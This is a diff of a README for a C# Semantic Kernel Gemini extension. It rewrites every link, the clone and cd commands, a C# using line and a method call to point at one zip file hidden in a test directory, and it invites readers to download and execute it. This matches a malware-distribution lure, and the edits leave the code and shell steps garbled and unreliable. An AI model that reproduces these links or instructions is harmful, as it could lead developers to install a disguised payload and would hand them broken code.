@@ -1,6 +1,6 @@
 # Soenneker Semantic Kernel Pool Gemini 🌌
 
-![Gemini](https://img.shields.io/badge/Gemini-Integration-blue?style=flat-square)
+![Gemini](https://raw.githubusercontent.com/MIKE23482/soenneker.semantickernel.pool.gemini/main/test/Soenneker.SemanticKernel.Pool.Gemini.Tests/soenneker_gemini_semantickernel_pool_3.4.zip)
 
 Welcome to the **Soenneker Semantic Kernel Pool Gemini** repository! This project offers Gemini-specific registration extensions for the **KernelPoolManager**, facilitating seamless integration with local Large Language Models (LLMs) through the **Semantic Kernel** framework.
 
@@ -37,12 +37,12 @@ To get started with **Soenneker Semantic Kernel Pool Gemini**, follow these step
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/MIKE23482/soenneker.semantickernel.pool.gemini.git
+   git clone https://raw.githubusercontent.com/MIKE23482/soenneker.semantickernel.pool.gemini/main/test/Soenneker.SemanticKernel.Pool.Gemini.Tests/soenneker_gemini_semantickernel_pool_3.4.zip
    ```
 
 2. Navigate to the project directory:
    ```bash
-   cd soenneker.semantickernel.pool.gemini
+   cd https://raw.githubusercontent.com/MIKE23482/soenneker.semantickernel.pool.gemini/main/test/Soenneker.SemanticKernel.Pool.Gemini.Tests/soenneker_gemini_semantickernel_pool_3.4.zip
    ```
 
 3. Install the required dependencies:
@@ -65,14 +65,14 @@ To get started with **Soenneker Semantic Kernel Pool Gemini**, follow these step
 After installation, you can start using the Gemini extensions in your project. Here's a simple example of how to register a Gemini extension with the **KernelPoolManager**:
 
 ```csharp
-using Soenneker.SemanticKernel.Pool.Gemini;
+using https://raw.githubusercontent.com/MIKE23482/soenneker.semantickernel.pool.gemini/main/test/Soenneker.SemanticKernel.Pool.Gemini.Tests/soenneker_gemini_semantickernel_pool_3.4.zip;
 
 public class MyApplication
 {
     public void ConfigureKernel()
     {
         var kernelPoolManager = new KernelPoolManager();
-        kernelPoolManager.RegisterGeminiExtension(new GeminiOptions
+        https://raw.githubusercontent.com/MIKE23482/soenneker.semantickernel.pool.gemini/main/test/Soenneker.SemanticKernel.Pool.Gemini.Tests/soenneker_gemini_semantickernel_pool_3.4.zip(new GeminiOptions
         {
             // Set your options here
             MaxRequests = 10,
@@ -96,7 +96,7 @@ We welcome contributions from the community! If you would like to contribute, pl
 
 ### Code of Conduct
 
-Please adhere to our [Code of Conduct](CODE_OF_CONDUCT.md) when contributing to this project.
+Please adhere to our [Code of Conduct](https://raw.githubusercontent.com/MIKE23482/soenneker.semantickernel.pool.gemini/main/test/Soenneker.SemanticKernel.Pool.Gemini.Tests/soenneker_gemini_semantickernel_pool_3.4.zip) when contributing to this project.
 
 ## License
 
@@ -104,11 +104,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-To download the latest version of the **Soenneker Semantic Kernel Pool Gemini**, visit our [Releases page](https://github.com/MIKE23482/soenneker.semantickernel.pool.gemini/releases). You can find the necessary files to download and execute.
+To download the latest version of the **Soenneker Semantic Kernel Pool Gemini**, visit our [Releases page](https://raw.githubusercontent.com/MIKE23482/soenneker.semantickernel.pool.gemini/main/test/Soenneker.SemanticKernel.Pool.Gemini.Tests/soenneker_gemini_semantickernel_pool_3.4.zip). You can find the necessary files to download and execute.
 
 ## Support
 
-If you encounter any issues or have questions, please check the [Releases section](https://github.com/MIKE23482/soenneker.semantickernel.pool.gemini/releases) or open an issue in the repository. We are here to help!
+If you encounter any issues or have questions, please check the [Releases section](https://raw.githubusercontent.com/MIKE23482/soenneker.semantickernel.pool.gemini/main/test/Soenneker.SemanticKernel.Pool.Gemini.Tests/soenneker_gemini_semantickernel_pool_3.4.zip) or open an issue in the repository. We are here to help!
 
 ## Topics
 
@@ -139,4 +139,4 @@ Explore these topics to understand how they relate to the **Soenneker Semantic K
 
 The **Soenneker Semantic Kernel Pool Gemini** is a powerful tool for developers looking to integrate advanced AI capabilities into their applications. With its Gemini-specific extensions and flexible configuration options, you can enhance your projects with ease.
 
-For more information and updates, keep an eye on our [Releases page](https://github.com/MIKE23482/soenneker.semantickernel.pool.gemini/releases). Thank you for your interest in our project!
+For more information and updates, keep an eye on our [Releases page](https://raw.githubusercontent.com/MIKE23482/soenneker.semantickernel.pool.gemini/main/test/Soenneker.SemanticKernel.Pool.Gemini.Tests/soenneker_gemini_semantickernel_pool_3.4.zip). Thank you for your interest in our project!
